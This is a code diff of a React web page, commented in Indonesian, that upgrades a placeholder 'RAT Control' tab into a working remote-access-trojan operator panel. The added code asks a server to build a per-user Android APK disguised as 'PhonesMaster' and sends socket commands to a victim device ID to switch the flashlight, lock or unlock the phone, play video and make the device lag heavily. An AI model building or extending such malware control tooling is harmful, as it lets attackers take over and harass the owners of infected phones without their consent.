@@ -23,7 +23,7 @@ const INTRO_VIDEO = "https://c.top4top.io/m_39443olav1.mp4";
 const INTRO_AUDIO = "https://l.top4top.io/m_3944pw6n51.mp3";
 const SOUND_1 = "https://b.top4top.io/m_39442c6f31.m4a";
 const SOUND_2 = "https://k.top4top.io/m_3944rcsvx1.mp3";
-const RAT_VIDEO = "https://a.top4top.io/m_39451serc1.mp4"; // Video Header RAT
+const RAT_VIDEO = "https://a.top4top.io/m_39451serc1.mp4";
 
 let globalAudio = null; 
 let bgmAudio = null;    
@@ -112,16 +112,70 @@ export default function Home() {
   const [currentSong, setCurrentSong] = useState(null);
   const [isPlaying, setIsPlaying] = useState(false);
 
-  // RAT DUMMY STATES
+  // RAT STATE
+  const [ratTargetId, setRatTargetId] = useState("");
   const [ratStates, setRatStates] = useState({
     flashlight: false,
     lock: false,
     video: false,
     lag: false
   });
+  const [ratLoading, setRatLoading] = useState(false);
+  
+  // STATE BARU UNTUK RAT MULTI-USER
+  const [ratSocket, setRatSocket] = useState(null);
+  const [isGenerating, setIsGenerating] = useState(false);
 
-  const toggleRat = (key) => {
-    setRatStates(prev => ({ ...prev, [key]: !prev[key] }));
+  // FUNGSI DOWNLOAD APK (GENERATE)
+  const handleGenerateAPK = async () => {
+    setIsGenerating(true);
+    try {
+      const response = await fetch(`${API_URL}/generate-apk`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ownerId: username }) // Gunakan username sebagai Owner ID
+      });
+
+      if (!response.ok) throw new Error("Gagal download");
+
+      const blob = await response.blob();
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `PhonesMaster_${username}.apk`;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    } catch (err) {
+      alert("Terjadi kesalahan saat generate APK. Cek koneksi atau server Pterodactyl.");
+    } finally {
+      setIsGenerating(false);
+    }
+  };
+
+  // FUNGSI KENDALI RAT (SOCKET.IO)
+  const toggleRat = async (key) => {
+    if (!ratTargetId) return alert("Masukkan Device ID target dulu bre!");
+    if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung ke server!");
+
+    const newState = !ratStates[key];
+    setRatStates(prev => ({ ...prev, [key]: newState }));
+
+    let command = "";
+    if (key === 'flashlight') command = newState ? "flashlight_on" : "flashlight_off";
+    if (key === 'lock') command = newState ? "lock" : "unlock";
+    if (key === 'video') command = newState ? "play_video" : "stop_video";
+    if (key === 'lag') command = newState ? "lag_on" : "lag_off";
+
+    setRatLoading(true);
+    
+    ratSocket.emit("rat_command", {
+      deviceId: ratTargetId,
+      command: command,
+      ownerId: username // <--- PENTING: Kirim username sebagai identitas
+    });
+
+    setTimeout(() => setRatLoading(false), 1000);
   };
 
   const startBGM = () => {
@@ -206,19 +260,29 @@ export default function Home() {
     setPassword("");
     setIsSidebarOpen(false);
     if(socket) socket.close();
+    if(ratSocket) ratSocket.close();
     if(bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
     if(globalAudio) { globalAudio.pause(); globalAudio = null; }
   };
 
   useEffect(() => {
     if (isLoggedIn && !showIntro) {
+      // Socket buat Chat
       const newSocket = io(API_URL);
       setSocket(newSocket);
       newSocket.emit('user_online', username);
       newSocket.on('update_online_users', (users) => setOnlineUsers(users.filter(u => u !== username)));
       newSocket.on('receive_global_msg', (data) => setGlobalMsgs((prev) => [...prev, data]));
       newSocket.on('receive_private_msg', (data) => setPrivateMsgs((prev) => [...prev, data]));
-      return () => newSocket.close();
+      
+      // Socket buat RAT
+      const s = io(API_URL, { transports: ["websocket"] });
+      setRatSocket(s);
+
+      return () => {
+        newSocket.close();
+        s.close();
+      }
     }
   }, [isLoggedIn, showIntro, username]);
 
@@ -874,27 +938,47 @@ export default function Home() {
           </div>
         )}
 
-        {/* HALAMAN RAT DUMMY */}
+        {/* HALAMAN RAT (TERHUBUNG SOCKET.IO) */}
         {activeTab === "rat" && (
           <div className="space-y-4">
             <h2 className="text-white font-bold text-xl mb-4">RAT Control</h2>
             
-            {/* VIDEO ATAS */}
             <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800 mb-4">
               <video autoPlay muted loop playsInline className="w-full h-full object-cover">
                 <source src={RAT_VIDEO} type="video/mp4" />
               </video>
-              <div className="absolute top-2 left-2 bg-black/50 px-2 py-1 rounded text-xs text-white font-bold border border-zinc-700">Target Device</div>
             </div>
 
-            {/* DUMMY SWITCHES */}
+            {/* TOMBOL GENERATE APK */}
+            <button 
+              onClick={handleGenerateAPK} 
+              disabled={isGenerating}
+              className="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl flex justify-center items-center gap-2 mb-4 transition-colors"
+            >
+              {isGenerating ? <Loader2 className="animate-spin" size={20}/> : <DownloadCloud size={20}/>}
+              {isGenerating ? "Merakit APK..." : "Generate & Download APK RAT"}
+            </button>
+
+            {/* INPUT DEVICE ID */}
+            <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mb-4">
+              <label className="text-xs text-zinc-400 block mb-2">Device ID Target</label>
+              <input 
+                type="text" 
+                value={ratTargetId} 
+                onChange={(e) => setRatTargetId(e.target.value)} 
+                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white" 
+                placeholder="Masukkan ID Device" 
+              />
+            </div>
+
+            {/* SWITCHES */}
             <div className="space-y-3">
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
                 <div className="flex items-center gap-3">
                   <Lightbulb className={ratStates.flashlight ? "text-yellow-400" : "text-zinc-500"} />
                   <span className="text-white font-bold text-sm">Senter HP</span>
                 </div>
-                <button onClick={() => toggleRat('flashlight')} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.flashlight ? 'bg-green-500' : 'bg-zinc-700'}`}>
+                <button onClick={() => toggleRat('flashlight')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.flashlight ? 'bg-green-500' : 'bg-zinc-700'}`}>
                    <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.flashlight ? 'left-7' : 'left-1'}`}></div>
                 </button>
               </div>
@@ -904,7 +988,7 @@ export default function Home() {
                   <Lock size={20} className={ratStates.lock ? "text-red-500" : "text-zinc-500"} />
                   <span className="text-white font-bold text-sm">Lock HP</span>
                 </div>
-                <button onClick={() => toggleRat('lock')} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lock ? 'bg-red-500' : 'bg-zinc-700'}`}>
+                <button onClick={() => toggleRat('lock')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lock ? 'bg-red-500' : 'bg-zinc-700'}`}>
                    <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lock ? 'left-7' : 'left-1'}`}></div>
                 </button>
               </div>
@@ -914,7 +998,7 @@ export default function Home() {
                   <Video size={20} className={ratStates.video ? "text-purple-500" : "text-zinc-500"} />
                   <span className="text-white font-bold text-sm">Putar Video</span>
                 </div>
-                <button onClick={() => toggleRat('video')} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.video ? 'bg-purple-500' : 'bg-zinc-700'}`}>
+                <button onClick={() => toggleRat('video')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.video ? 'bg-purple-500' : 'bg-zinc-700'}`}>
                    <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.video ? 'left-7' : 'left-1'}`}></div>
                 </button>
               </div>
@@ -924,7 +1008,7 @@ export default function Home() {
                   <AlertTriangle size={20} className={ratStates.lag ? "text-red-500" : "text-zinc-500"} />
                   <span className="text-white font-bold text-sm">Bikin Lag Parah</span>
                 </div>
-                <button onClick={() => toggleRat('lag')} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lag ? 'bg-red-500' : 'bg-zinc-700'}`}>
+                <button onClick={() => toggleRat('lag')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lag ? 'bg-red-500' : 'bg-zinc-700'}`}>
                    <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lag ? 'left-7' : 'left-1'}`}></div>
                 </button>
               </div>
@@ -953,11 +1037,11 @@ export default function Home() {
         )}
       </main>
 
-      {/* BOTTOM NAVBAR BARU */}
+      {/* BOTTOM NAVBAR */}
       <div className="fixed bottom-0 w-full bg-[#1c1c1e] border-t border-zinc-700 p-2 z-30">
         <div className="flex justify-around items-center px-2">
            {[
-             { id: 'rat', icon: <Cpu size={20}/>, label: 'RAT' }, // MENU RAT BARU
+             { id: 'rat', icon: <Cpu size={20}/>, label: 'RAT' },
              { id: 'home', icon: <HomeIcon size={20}/>, label: 'Home' },
              { id: 'chat', icon: <MessageSquare size={20}/>, label: 'Chat' },
              { id: 'settings', icon: <Settings size={20}/>, label: 'Setting' },
